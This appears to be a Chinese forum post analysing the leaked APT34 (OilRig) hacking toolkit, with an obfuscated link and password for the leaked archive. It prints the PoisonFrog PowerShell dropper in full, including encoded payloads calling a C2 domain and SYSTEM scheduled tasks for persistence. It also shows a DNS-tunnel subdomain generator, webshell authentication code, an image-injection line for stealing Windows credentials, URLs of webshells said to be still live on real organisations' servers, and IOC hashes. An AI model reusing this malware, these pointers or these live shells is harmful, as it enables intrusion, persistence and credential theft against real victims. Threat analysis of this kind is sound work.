
# [原创]APT34黑客组织工具泄露事件分析

## 工具地址

`0ecK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6x3#2)9J5k6r3g2#2i4K6u0V1N6$3g2K6N6q4)9J5k6o6q4Q4x3X3g2S2L8h3q4\*7L8$3&6S2N6%4y4Q4x3X3g2U0L8$3#2Q4x3V1k6E0j5h3I4%4j5i4u0W2i4K6u0V1M7X3g2K6k6h3q4J5j5$3S2Q4x3X3g2G2M7X3N6Q4x3V1k6T1L8r3!0Y4M7r3!0K6N6s2y4Q4x3V1k6S2M7s2b7K6y4p5I4W2j5h3E0Q4x3V1k6S2M7s2b7K6y4r3I4W2j5h3E0Q4x3X3f1%4P5R3.`

解压密码：`vJrqJeJo2n005FF\*`

## 事件梳理

最近有人发布了属于伊朗国家背景的APT攻击组织APT34(oilrig,HelixKitten）的黑客工具，这起事件和之前影子经纪人泄漏NSA的黑客工具事件很相似，自3月中旬以来，这些工具已被一个自称Lab Dookhtegan的人在telegram节目上泄露。

![](https://bbs.kanxue.com/upload/attach/202002/823237_JAKGUSWFHXQ5SPW.jpg)

除了黑客工具之外，Dookhtegan还发布了一些似乎是来自APT34的一些黑客受害者的数据，这些数据主要包括似乎是通过网络钓鱼页面收集的用户名和密码组合。

![](https://bbs.kanxue.com/upload/attach/202002/823237_U6YAJ9KWHV6Z6EH.jpg)

披露了一些伊朗的情报人员信息

![](https://bbs.kanxue.com/upload/attach/202002/823237_X6DKQ3DN576BJZK.jpg)

从他对伊朗目标的打击方式来看，可以说是毫不留情。

![](https://bbs.kanxue.com/upload/attach/202002/823237_DTDQNBPS2H7GPRW.jpg)

工具包如下

![](https://bbs.kanxue.com/upload/attach/202002/823237_TTM34XWXUW8DUCH.jpg)

截至目前为止，黑客已经泄露了六个APT34的黑客工具的源代码，以及几个远控Webshell

![](https://bbs.kanxue.com/upload/attach/202002/823237_ENND7ZRY9E7ZUCF.jpg)

该黑客声称每隔几天就曝光一名工作人员个人信息

![](https://bbs.kanxue.com/upload/attach/202002/823237_UT6J5TVGAX4ZVRZ.jpg)

黑客工具列表：

- PoisonFrog (老版本BondUpdater)
- HyperShell (名为TwoFace的webshell)
- HighShell (另一个webshell)
- Webmask (DNS隧道，大名鼎鼎的DNSpionage)

## 工具分析

### 1. posionfrog

包括两部分

![](https://bbs.kanxue.com/upload/attach/202002/823237_TEX5QSA5VWRGGVM.jpg)

服务器端模块，`node.js`写的C2

代理程序部分，`powershell`版的payload

![](https://bbs.kanxue.com/upload/attach/202002/823237_BKNT4DHPJT99545.jpg)

```powershell
${global:$address1} = $env:PUBLIC + "\Public";

${global:$dns_ag} = "JENDQSA9ICJteWxlZnRoZWFydC5jb20iOw0KJEREQSA9IGdldC13bWlvYmplY3QgV2luMzJfQ29tcHV0ZXJTeXN0ZW1Qcm9kdWLUVuY29kaW5nIEJ5dGU7DQoJJGUgPSByZXNvbHZlcigkZik7DQoXN0LVBhdGggLVBhdGggJHtnbG9iYWw6JFNTQn0pIC1vciAtbm90IChUZXN0LVBhdGggLVBhdGggJHtnbG9iYWw6JEFBQn0pKQ0Kew0KCW1kICR7Z2xvYmFsOiRTU0J9Ow0KCW1kICR7Z2xvYmFsOiRBQUJ9Ow0KCW1kICR7Z2xvYmFsOiRRUUF9Ow0KCW1kICR7Z2xvYmFsOiRUVEJ9Ow0KfQ0KcmVjZWl2ZTsNCnByb2Nlc3NvcjsNCnNlbmQ7";

${global:$http_ag} = "JEJCQSA9ICJodHRwOi8vIiArIFtTeXN0ZW0uTmV0LkRuc106OkdldEhvc3RBZGRyZXNzZXMoIm15bGVmdGhlYXJ0LmNvbSIpDQoke2dsb2JhbDokQ0NBfSA9IG5ldy1vYmplY3Qgc3lzdGVtLm5ldC5XZWJDbGllbnQNCiR0ID0gZ2V0LXdtaW9iamVjdCBXaW4zMAtZXEgIjEiKSB7DQoJCQkJJHIgPSAkdHJ1ZTsNCgkJCX0NCgkJCWlmKCRUVEEgLW5lICJub3QiIC1hbmQgJFRUQSkgew0KCQkJCSR7Z2xvYmFsOiRDQ0F9LlVwbG9hZEZpbGUoIiRCQkEvcmVzLyRQUEEkVFRBIiwgJHApOw0KCQkJCVJlbW92ZS1JdGVtICRwIC1Gb3JjZQ0KCQkJfQ0KCQl9DQoJfQ0KfQ==";



if (-not (Test-Path -Path ${global:$address1}))

{md ${global:$address1}; Get-Item ${global:$address1} -Force | %{$_.attributes = "Hidden"}}

if (Test-Path -Path ${global:$address1})

{

	[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String([string]${global:$http_ag})) | Set-Content "${global:$address1}\hUpdater.ps1";

	[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String([string]${global:$dns_ag})) | Set-Content "${global:$address1}\dUpdater.ps1";

	"command0 = `"Powershell.exe -exec bypass -file ${global:$address1}\hUpdater.ps1`"`nset Shell0 = CreateObject(`"wscript.shell`")`nshell0.run command0, 0, false`ncommand1 = `"Powershell.exe -exec bypass -file ${global:$address1}\dUpdater.ps1`"`nset Shell1 = CreateObject(`"wscript.shell`")`nshell1.run command1, 0, false" | Out-File "${global:$address1}\UpdateTask.vbs"

	schtasks /create /F /sc minute /mo 10 /tn "\UpdateTasks\UpdateTask" /tr "wscript /b \`"${global:$address1}\UpdateTask.vbs\`"";

	schtasks /create /F /ru SYSTEM /sc minute /mo 10 /tn "\UpdateTasks\UpdateTaskHosts" /tr "wscript /b \`"${global:$address1}\UpdateTask.vbs\`"";

}
```

代理程序部分包含2个base64，它们加载了powershell，这似乎是第一阶段的payload。它从`myleftheart.com`（现在已经关闭）中去获取配置文件，在`C:\Users\Public\Public`中创建一堆文件夹，并在那里删除其他两个payload。它还创建了2个计划任务，一个具有管理员权限，一个具有普通用户权限，这些任务将运行两个PowerShell的脚本; `dUpdater.ps1`和`hUpdater.ps`每10分钟一次。现在从这两个payload中可以清楚地看到它可以接收和发送文件。

好像这里还使用了代理：

```powershell
schtasks /create /F /sc minute /mo 10 /tn "\UpdateTasks\UpdateTask" /tr "wscript /b \`"${global:$address1}\UpdateTask.vbs\`"";

schtasks /create /F /ru SYSTEM /sc minute /mo 10 /tn "\UpdateTasks\UpdateTaskHosts" /tr "wscript /b \`"${global:$address1}\UpdateTask.vbs\`"";
```

配置文件中存有登录用户名密码

![](https://bbs.kanxue.com/upload/attach/201904/823237_EWM9AG77A9WWZFF.jpg)

```powershell
$u = "http://" + $HHA + ":" + $KKA;



 $MMA = new-object System.Net.WebProxy($u, $true);



 $NNA = new-object System.Net.NetworkCredential($IIA, $JJA, $LLA)



 $MMA.credentials = $NNA
```

这个函数返回`myleftheart.com`域的子域：

```powershell
CCA = "myleftheart.com";$DDA = get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID | %{ "atag12" + $_.replace('-','') }| %{$_ + "1234567890"} | %{$_.substring(0,10)}

function EEA ($FFA, $GGA, $HHA, $IIA, $JJA){ $KKA = -join ((48 .. 57)+(65 .. 70) | Get-Random  -Count (%{ Get-Random -InputObject (1 .. 7) }) | %{ [char]$_ }); $LLA = Get-Random -InputObject (0 .. 9) -Count 2; $MMA = $DDA.Insert(($LLA[1]), $GGA).Insert($LLA[0], $FFA); write-host $DDA; if ($JJA -eq "s")

 { Print "$($MMA)$($KKA)A$($LLA[0])$($LLA[1])7.$HHA.$IIA.$CCA";} else  { Print "$($MMA)$($KKA)A$($LLA[0])$($LLA[1])7.$($CCA)";}
```

### 2. Asp WebShell

泄漏的很大一部分有大量的，被称为和，其中包含了相当多的变种。 超过30k行代码… 为了查看shell，你需要有一个叫做的和正确的密码。不幸的是，泄漏者删除了所有有意义的密码，并用替换了它们。

将cookie与te字符串进行比较，这是base64后的结果：`base64(sha256(Bytes(cookie+salt)))`

```csharp
bool c(){try{if(HttpContext.Current.Request.Cookies["p"]!=null){aut=Convert.ToBase64String(new System.Security.Cryptography.SHA256CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(fb(HttpContext.Current.Request.Cookies["p"].Value)+salt)))==pp;if(!aut)rm();return aut;}}catch(Exception e){l(e.Message);}rm();return false;}
```

似乎有2个ASP Shell仍然在线：

```
hxxps://webmail.sstc.com.sa/owa/auth/logout.aspx
hxxps://mail.adac.ae/owa/auth/RedirOutlookService.aspx/
```

### 3. webmask_dnspionage

这是一个ICAP服务器，似乎能够接收所有类型的数据，如凭据，cookie …

![](https://bbs.kanxue.com/upload/attach/201904/823237_BHJ8S2TKPAP3DX3.jpg)

这一行比较有意思：

```javascript
script = ';$(document).ready(function(){$(\'<img src="file://[ip]/resource/logo.jpg"><img src="http://WPAD/avatar.jpg">\');});'
```

`[ip]`应该是被替换成攻击者IP，然后当它作为img注入到受害者的浏览器时，它将触发Windows跳转到并且攻击者将能够窃取。

第二部分是`dns.py`，也有它的javascript代码`dnsd.js`响应。所以基本上这将使攻击者能够将使用该dns的受害者发送到他自己的恶意服务器上。

其他文件包含了许多来自用户的私钥和凭据，还包含许多域的DA凭据：

![](https://bbs.kanxue.com/upload/attach/201904/823237_HJJ5BPBRPAKBYDZ.jpg)

![](https://bbs.kanxue.com/upload/attach/201904/823237_HVBSYBFZEVVUXS7.jpg)

### 4. data

其他大多数均为一些数据信息，没有细致看

![](https://bbs.kanxue.com/upload/attach/201904/823237_ES326G3FY4RQSC5.jpg)

![](https://bbs.kanxue.com/upload/attach/201904/823237_H3CX2VNCGP9PJ9S.jpg)

## IOC

```
27e03b98ae0f6f2650f378e9292384f1350f95ee4f3ac009e0113a8d9e2e14ed

b1d621091740e62c84fc8c62bcdad07873c8b61b83faba36097ef150fd6ec768

2943e69e6c34232dee3236ced38d41d378784a317eeaf6b90482014210fcd459

07e791d18ea8f2f7ede2962522626b43f28cb242873a7bd55fff4feb91299741

dd6d7af00ef4ca89a319a230cdd094275c3a1d365807fe5b34133324bdaa0229

3ca3a957c526eaeabcf17b0b2cd345c0fffab549adfdf04470b6983b87f7ec62

c9d5dc956841e000bfd8762e2f0b48b66c79b79500e894b4efa7fb9ba17e4e9e

a6a0fbfee08367046d3d26fb4b4cf7779f7fb6eaf7e60e1d9b6bf31c5be5b63e

fe1b011fe089969d960d2dce2a61020725a02e15dbc812ee6b6ecc6a98875392
```

## Shell
